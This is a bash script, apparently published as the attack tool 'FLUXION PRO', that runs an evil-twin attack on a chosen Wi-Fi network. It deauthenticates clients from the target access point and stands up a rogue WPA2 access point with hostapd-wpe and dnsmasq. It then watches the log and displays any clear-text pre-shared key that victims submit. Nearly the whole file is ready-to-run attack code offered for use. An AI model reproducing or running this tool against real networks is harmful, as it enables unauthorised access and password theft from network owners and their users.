#!/bin/bash
# =============================================================================
# ███████╗██╗     ██╗   ██╗██╗  ██╗██╗ ██████╗ ███╗   ██╗    ██████╗ ██████╗  ██████╗ 
# ██╔════╝██║     ██║   ██║╚██╗██╔╝██║██╔═══██╗████╗  ██║    ██╔══██╗██╔══██╗██╔═══██╗
# █████╗  ██║     ██║   ██║ ╚███╔╝ ██║██║   ██║██╔██╗ ██║    ██████╔╝██████╔╝██║   ██║
# ██╔══╝  ██║     ██║   ██║ ██╔██╔╝ ██║██║   ██║██║╚██╗██║    ██╔═══╝ ██╔══██╗██║   ██║
# ██║     ███████╗╚██████╔╝██╔╝ ██╗ ██║╚██████╔╝██║ ╚████║    ██║     ██║  ██║╚██████╔╝
# ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═╝ ╚═════╝ ╚═╝  ╚═══╝    ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 
#
#                               Code name : FLUXION PRO
#                     Wi-Fi PSK Clear-Text Disclosure Attack
#
#   Author        : Trésor Mika Lankoandé
#   Email         : tresormikalankoande@gmail.com
#   GitHub        : https://github.com/tresromika
#   Version       : 2025.1 — International Release (English)
# =============================================================================

set -euo pipefail
trap cleanup SIGINT SIGTERM EXIT

# Colors
R='\033[1;31m' G='\033[1;32m' Y='\033[1;33m' C='\033[1;36m' W='\033[1;37m' N='\033[0m'

# Tool info
AUTHOR="Trésor Mika Lankoandé"
EMAIL="tresormikalankoande@gmail.com"
GITHUB="https://github.com/tresromika"
TOOL="FLUXION PRO"
VERSION="2025.1"
LOGFILE="/tmp/fluxion-pro.log"

IFACE="" IFACEMON="" SSID="" BSSID="" CHANNEL=""

cleanup() {
    echo -e "\n${Y}[*] Cleaning up $TOOL...${N}"
    killall hostapd-wpe dnsmasq aireplay-ng 2>/dev/null || true
    [[ -n "$IFACEMON" ]] && airmon-ng stop "$IFACEMON" &>/dev/null || true
    [[ -n "$IFACE" ]] && ip addr del 192.168.100.1/24 dev "$IFACE" 2>/dev/null || true
    echo -e "${G}[+] $TOOL stopped cleanly — $AUTHOR${N}"
    exit 0
}

banner() {
    clear
    echo -e "${C}
    ╔══════════════════════════════════════════════════════════════════╗
    ║                       ${W}$TOOL${C} – v$VERSION                       ║
    ║              Wi-Fi PSK Clear-Text Disclosure Attack             ║
    ║                                                                  ║
    ║   Author   : $AUTHOR                        ║
    ║   Contact  : $EMAIL                  ║
    ║   GitHub   : $GITHUB                   ║
    ╚══════════════════════════════════════════════════════════════════╝${N}"
}

check_root() {
    [[ $EUID -ne 0 ]] && { echo -e "${R}[✘] This script must be run as root (sudo)${N}"; exit 1; }
}

check_tools() {
    local missing=""
    for tool in aircrack-ng hostapd-wpe dnsmasq beep; do
        command -v "$tool" &>/dev/null || missing="$missing $tool"
    done
    [[ -n "$missing" ]] && {
        echo -e "${R}[✘] Missing tools →$missing${N}"
        echo -e "${Y}    → sudo apt update && sudo apt install aircrack-ng hostapd-wpe dnsmasq beep${N}"
        exit 1
    }
    echo -e "${G}[✔] All dependencies found${N}"
}

get_input() {
    echo -e "\n${C}Attack Configuration${N}"
    read -p "   Wireless Interface (e.g. wlan0)    → " IFACE
    read -p "   Target SSID                        → " SSID
    read -p "   Target BSSID (AA:BB:CC:DD:EE:FF)   → " BSSID
    read -p "   Channel (1-13)                     → " CHANNEL
    [[ -z "$IFACE$SSID$BSSID$CHANNEL" ]] && { echo -e "${R}[✘] All fields are required${N}"; exit 1; }
    IFACEMON="${IFACE}mon"
}

show_config() {
    echo -e "\n${G}════════════════════════════════════════════════${N}"
    echo -e "   ${W}Tool            ${N}: $TOOL v$VERSION"
    echo -e "   ${W}Author          ${N}: $AUTHOR"
    echo -e "   Interface       : $IFACE → $IFACEMON"
    echo -e "   Target SSID     : $SSID"
    echo -e "   Target BSSID    : $BSSID"
    echo -e "   Channel         : $CHANNEL"
    echo -e "   Fake AP IP      : 192.168.100.1"
    echo -e "${G}════════════════════════════════════════════════${N}\n"
    read -p "Press Enter to launch $TOOL…"
}

launch_attack() {
    airmon-ng check kill &>/dev/null
    airmon-ng start "$IFACE" &>/dev/null

    echo -e "${Y}[*] Deauthenticating clients (25s)…${N}"
    timeout 25 aireplay-ng --deauth 0 -a "$BSSID" "$IFACEMON" &>/dev/null &

    cat > /tmp/fluxion.conf <<EOF
interface=$IFACE
driver=nl80211
ssid=$SSID
hw_mode=g
channel=$CHANNEL
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
rsn_pairwise=CCMP
EOF

    hostapd-wpe /tmp/fluxion.conf -e "$LOGFILE" &>/dev/null &
    ip addr add 192.168.100.1/24 dev "$IFACE" &>/dev/null
    dnsmasq -C /dev/null -kd -F 192.168.100.100,192.168.100.200,12h -i "$IFACE" --dhcp-option=3,192.168.100.1 &>/dev/null &

    echo -e "${G}[✔] $TOOL is running – Waiting for clear-text PSK…${N}\n"
}

capture_psk() {
    tail -f "$LOGFILE" | grep --line-buffered -i "PSK" | while read -r line; do
        PASS=$(echo "$line" | grep -o "PSK: .*")
        clear
        echo -e "${R}╔══════════════════════════════════════════════════════════╗${N}"
        echo -e "${R}║               PASSWORD CAPTURED – $TOOL              ║${N}"
        echo -e "${R}╚══════════════════════════════════════════════════════════╝${N}"
        echo -e "${G}   SSID         : $SSID${N}"
        echo -e "${G}   BSSID        : $BSSID${N}"
        echo -e "${R}   PASSWORD     : ${PASS:5}${N}"
        echo -e "\n${Y}   Created by $AUTHOR${N}"
        echo -e "${Y}   Full log → $LOGFILE${N}"
        beep -f 1500 -l 100 -r 5 &>/dev/null || true
        read -p "Press Enter to exit…" && cleanup
    done
}

# ====================== MAIN ======================
banner
check_root
check_tools
get_input
show_config
launch_attack
capture_psk
